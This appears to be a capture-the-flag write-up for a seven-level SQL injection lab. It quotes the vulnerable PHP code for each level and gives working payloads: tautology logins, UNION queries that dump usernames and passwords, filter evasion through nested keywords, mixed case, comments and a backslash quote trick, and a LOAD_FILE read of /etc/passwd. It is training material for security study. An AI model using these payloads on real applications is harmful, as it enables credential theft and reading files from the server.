http://34.66.235.224:12000/

###############################################################################
Level 1
###############################################################################
Explanation:-------------------------------------------------------------------
  This is classic SQL injection where you can directly manipulate the query
  through the text entry field. Vulnerable code:

    if (isset($_POST['session_id'])) {
        $query = "SELECT * FROM secrets WHERE session_id = '
            " . $_POST['session_id'] . "'";
        $result = $conn->query($query);
    }

  We want results from more than just session_id = <fixed value>, so we just
  break out of that query with a ' and OR with something that gets more results.

Solution:----------------------------------------------------------------------
  ' OR session_id LIKE '%%

###############################################################################
Level 2
###############################################################################
Explanation:-------------------------------------------------------------------
  This time they say they used prepared statements. This is true for the
  password part, but we can control username:
    
    $query = "SELECT username FROM users where username = '" . $_POST['username
      '] . "' and password = ?";
  
  For this example, it is important to know that 'AND' has higher precedence
  than 'OR', so we can use this fact to manipulate results and return the
  administrator. Essentially, the 'AND' works to limit the results, but since
  it runs before 'OR', we can craft a set of logical operations that result
  in the password checking being useless and we can return the admininstrtor
  row/info.

    $query = $conn->prepare($query); <----- CRAFT MALICIOUS SQL TO PASS THIS
                                              TRIAL AND ERROR

    // If query is invalid
    if ($query === false) {
        $error = true;
        $error_msg = "<strong>Error!</strong> Invalid SQL query";    
    } else { 

    // Bind password param
    $query->bind_param("s", $_POST['password']);
    $query->execute();
    $query->bind_result($user); <----- AND/OR PRECEDENCE RULES ALLOW
                                        US TO BIND ADMINISTRATOR TO USER
    $query->fetch();

        // Check if a valid user has been found
        if ($user != NULL) { `
            session_start();
            $_SESSION['is_logged_in'] = true;
            $_SESSION['username'] = $user;
        } else {
            $error = true;
            $error_msg = "<strong>Wrong!</strong> Username/Password is invalid.";
        }
    }
  
Solution:----------------------------------------------------------------------
  administrator' OR '1

###############################################################################
Level 3
##############################################################################
Explanation:-------------------------------------------------------------------
  The search engine tries to filter words, but we can get around this because we
  know how they are filtering:

    $_GET['q'] = preg_replace('/' . $banned . '/i', '', $_GET['q']);

  This is just commenting out the banned parts. So lets put the banned words 
  (union and select) inside themselves. Union becomes UNunionION and select
  becomes SEselectLECT. Now we can use these banned words into the query:

    SELECT * FROM search_engine WHERE title LIKE '%" . $_GET['q'].  "%' OR 
      description LIKE '%" . $_GET['q'] .  "%' OR link LIKE '%" . $_GET['q'] . 
      "%';

  We can abuse this query like this to get the table names:

    greatest%' UNUNIONION (SESELECTLECT TABLE_NAME,TABLE_SCHEMA,3 FROM 
     information_schema.tables);-- %';

  This query reveals a useful table. The users table might have good info in it.
  With a little intelligent guessing of what the flag might be (username
  password) we ca can grab the fields and get the flag:

    greatest%' UNUNIONION (SESELECTLECT users.username, users.password,3 FROM 
      users);#

  Note that we finish with '#' which in mySQL comments out the entire line.

Solution:----------------------------------------------------------------------
  greatest%' UNunionION (SEselectLECT users.username, users.password,3 FROM 
    users);#

###############################################################################
Level 4
##############################################################################
Explanation:-------------------------------------------------------------------
  They tried to protect against us by adding more filters rather than
  commenting out malicious sql keywords:

    // Remove all banned characters
    foreach ($filter as $banned) {
        if (strpos($_GET['q'], $banned) !== false) die("Hacker detected"); 
        if (strpos($_GET['q'], strtolower($banned)) !== false) die("Hacker detected"); 
    } 
  
  These checks are not robust. The first one checks the raw string to see if
  it equals the banned words:

     $filter = array('UNION', 'SELECT');

  The second checks to see if where are using lowercase versions. This is bad
  though because we can use mixed case to bypass these and inject SQL (using
  UniON and SElect).

Solution:----------------------------------------------------------------------
  greatest%' UniON (SElect users.username, users.password,3 FROM  users);# 

###############################################################################
Level 5
##############################################################################
Explanation:-------------------------------------------------------------------
  In this level, they tried to ban spaces in all queries:

    if (isset($_GET['q'])) {
        // Ban space character
        if (strpos($_GET['q'], " ") !== false) die("Hacker detected"); 
    }

  SQL allows paranthetical grouping, so whenever a SQL command occurs, we
  can replace the space with a parenthessis. Where there isn't a command
  we can use block comments. And finally for the finally comment everthing
  after our importnat query with #.
Solution:----------------------------------------------------------------------
    %'/**/UNION(SELECT(users.username),(users.password),(3)FROM(users));#

###############################################################################
Level 6
##############################################################################
Explanation:-------------------------------------------------------------------
  In this level, they tried to ban double and single quotes:

    if (isset($_GET['q'])) {
      // Ban space character
      if (strpos($_GET['q'], "'") !== false) die("Hacker detected"); 
      if (strpos($_GET['q'], '"') !== false) die("Hacker detected"); 
    }
  
  Now we cant escape with a quote. However, we can turn the normal ' into an
  string by composing an injected SQL query that contains the \ symbol. To
  illustrate the concept, consider the SQL query:

    SELECT * FROM table Where username = ' TOKEN ' OR extra junk

  If our token is \, then:

    SELECT * FROM table Where username = ' \' OR extra junk

  Now, the quote is unclosed and everything beyond the token is now a string.
  We need to grab values from the users table by injecting something into
  the query:

    SELECT * FROM search_engine WHERE title LIKE '%" . $_GET['q'].  "%' OR 
      description LIKE '%" . $_GET['q'] .  "%' OR link LIKE '%" . $_GET['q'] . 
      "%';
  
  I just played around with this in an editor that showed me how the statement
  would behave. Initially, I just put in a \ to see what the result was. Then
  I tried UNION \ and the syntax highlighting feature of the editor showed
  that with this injection, some parts were exectuable query statements. So,
  I just re-used the same injection to get the flag.

Solution:----------------------------------------------------------------------
  UNION SELECT users.username,users.password,3 FROM users;# \

###############################################################################
Level 7
##############################################################################
  Lots of trial and error on this one. We aren't given source code, but we
  are told that we might open a file. We know:

    1) file is in /etc/passwd --> use LOAD_FILE
    2) we are doing an SQL challenge --> assume attack is SQL
    3) we are posting something to /level7.php?id=INT --> INT is SQL injection

  I got a "hacking detected" error from working off these assumptions, so I was
  on the right track. This took a ton of trial and error but got to a milestone:

    http://34.66.235.224:12000/level7.php?id=(LEAST(1,2)AND(0))

  The query always returned the same thing. This was because AND resulted in 
  the id=0 string message to be returned. More trial and error lead me to:

    34.66.235.224:12000/level7.php?id=(LEAST(0,0)OorR(1))

  Now we know some of the injection prevention methods they used:
    1) Banned words are [or,union,select,load_file,where,from]
    2) Spaces are dissallowed
    3) String detection of banned words along with trunction

  This lead me eventually to the solution. A couple of important other
  milestones:
    1) document.location = document.location.origin + "/level7.php?id=(LEAST(0,
            0))/**/UNunionION(SEselectLECT/**/1/**/)"
          INFO: paranthetical separation was acting fully, so I tried to
                use spaces wherever possible
    2) document.location = document.location.origin + "/level7.php?id=0/**/
            UNunionION(SEselectLECT(text)/**/FrfromOM/**/motivation/**/
            WHwhereERE/**/id=3)"
          INFO: This still resulted in the same thing over and over needed to
                find a way to append the result of another query to this one
                that wasnt union.
    3) document.location = document.location.origin + "/level7.php?id=0/**/AND
            /**/id=1/**/UNunionION(SEselectLECT('i can return this text!'))"
          INFO: BINGO! I can make the first call result no rows and just
                union with the relevant file.

  To see the flag, I had to zoom out of my browser.

Solution:----------------------------------------------------------------------
  document.location = document.location.origin + "/level7.php?id=0/**/AND/**/id
    =1/**/UNunionION(SEselectLECT/**/LOAD_FIload_fileLE('/etc/passwd'))"
